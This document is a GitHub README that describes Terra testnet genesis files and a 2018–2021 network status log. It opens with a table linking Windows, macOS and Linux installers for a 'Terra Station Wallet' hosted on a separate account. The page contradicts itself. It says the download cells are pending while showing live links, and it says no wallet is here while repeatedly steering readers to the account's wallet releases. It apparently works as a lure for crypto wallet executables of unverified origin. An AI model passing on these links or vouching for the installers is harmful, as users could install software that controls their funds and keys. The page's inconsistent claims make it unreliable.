![Terra Station Wallet](assets/banner-repo.png)

<h1 align="center">Terra Testnets</h1>

<p align="center">Genesis and configuration files for Terra's testnets, kept in their own repository so the Core repository does not carry them.</p>

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/license-unknown-5392F7?style=for-the-badge&labelColor=101A42" alt="license unknown"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

What this repository offers for download is genesis data; the wallet's installers are attached to its release page, and the cells above stay PENDING until they exist.

## What this repository is for

The repository is named `alliance-protocol`, and its README is titled Terra Testnets. That mismatch is the first thing to state plainly: what sits here is a collection of genesis and configuration files for the various Terra testnets, and the README gives the reason for a separate home. The Core repository would otherwise be weighed down by large genesis files and by status updates that change far more often than the chain code.

Two networks are listed as the latest at the time the README was last written: `bombay-10`, described as the testnet for `columbus-5`, and `tequila-0004`, described as the testnet for `columbus-4`. Beneath them the README keeps a status log that runs from November 2018 to August 2021, recording which network went live and which was retired at each dated entry, from `terra-0000` and the `soju` series through `vodka`, `tequila` and the `bombay` line.

That log is the most useful thing in the repository and also the most easily misread. It is a record of what happened, in the order it happened, not a statement about what is running now.

## Who it is for

- A node operator joining one of the listed testnets who needs the genesis file for that network.
- A chain historian or researcher tracing the succession of Terra testnets and their dates.
- A developer reproducing an old environment against the network that was live at a given tag.
- A user who searched for a wallet and arrived at a directory of JSON files.

This page does not hand anyone a wallet and the repository does not contain one. If that is what you wanted, the account's application repository is the place to go.

## Start here

- [Terra Station Wallet](https://github.com/terraclassic-wallet/terra-station-wallet) - The application this account maintains for people to download.
- [Terra Station Wallet releases](https://github.com/terraclassic-wallet/terra-station-wallet/releases) - The current tag, with attached files and the hashes beside them.
- [What Terra Station Wallet Is and Who Maintains It](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-what-is-it.md) - The boundary of the product, without sales copy.
- [The account profile](https://github.com/terraclassic-wallet) - A map of the repositories on this account.
- [LUNC address and chain id](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-address-and-chain-id.md) - The two identifiers a testnet session depends on.
- [Terra Classic history](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-history.md) - How the networks succeeded one another from 2019 onward.
- [Terra Classic explorer](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-explorer.md) - Where to read chain state without trusting a screenshot.

## How to use this repository

1. Decide which network you want, using the two entries under Latest networks as the starting point.
2. Open the directory named for that network and take the genesis file and configuration from it.
3. Read the status log for the date of that network's retirement before you invest time in joining it. Several of the entries are years old.
4. Follow the project's own node documentation for the join procedure. This repository holds files, not instructions, and the README points outward for the steps.
5. Treat the directory listing as the authority on what exists. A network named in the log may have no directory left, and a directory may describe a network the log calls retired.

## The guides, grouped

The README has three parts, and each answers a different question:

| Part | Covers | Read it when |
| --- | --- | --- |
| Latest networks | The two most recent testnets and the mainnet each one pairs with | You are choosing a network |
| Getting Started | A pointer to the joining procedure | You have chosen and need the steps |
| Testnet Status | Dated entries from 2018 to 2021, each naming the network that went live and the one retired | You need to know when a network existed |

## What each network changes.

| Network | Paired with | What the README says |
| --- | --- | --- |
| bombay-10 | columbus-5 | Listed as the latest testnet, in the entry dated August 2021 |
| tequila-0004 | columbus-4 | Listed as a testnet, one line below bombay-10 |
| Earlier networks | Their own generations | Named in the status log with the date they launched or retired |

## Common first questions

### Does this repository contain mainnet genesis?

No. It holds testnet material. Mainnet networks appear only as the chain each testnet is paired with, in the descriptions, and not as files here.

### Is bombay-10 still running?

The README's most recent status entry is dated August 2021 and calls `bombay-10` live. That is a record of that date, not a live check. Confirm the current state before you join anything, because a testnet can be retired without the log being the first place you would hear it.

### Why is the repository called alliance-protocol?

The name does not describe the contents, and this page will not invent a history to explain it. The README is titled Terra Testnets, the directories are testnets, and that is what the repository holds.

### Is there a licence?

No licence file is recorded in this repository, and GitHub reports none. Without a licence, the default position is that the copyright holder keeps their rights, so treat the files as readable rather than reusable unless the owner says otherwise.

### Does this account publish the wallet from here?

No. The wallet is released from its own repository, with installers and checksums on the release page. Nothing in this repository is an application.

## Before you build

Genesis files are large and easy to mistrust, so compare what you download with what the directory contains before you start a node on it. Read the retirement entries first, since joining a network that was retired years ago wastes an evening. And if your goal was to run a wallet rather than a node, stop: the software you want is elsewhere in this account, and this repository has nothing to install.

## About this repository

This is one of the repositories that existed on the account before this documentation was written, and it is kept for the files it holds rather than as a product page. The account's own reading lives in three hubs covering installation, recovery and daily use. This repository's documentation is the README, and the page in front of you exists to say what the README is and is not.

## Licence and reuse

No licence is recorded here, and the badge above reads unknown. Absent terms, do not assume permission to reuse the files; ask the copyright holder, and read the repository again before you rely on anything this page says about its terms.
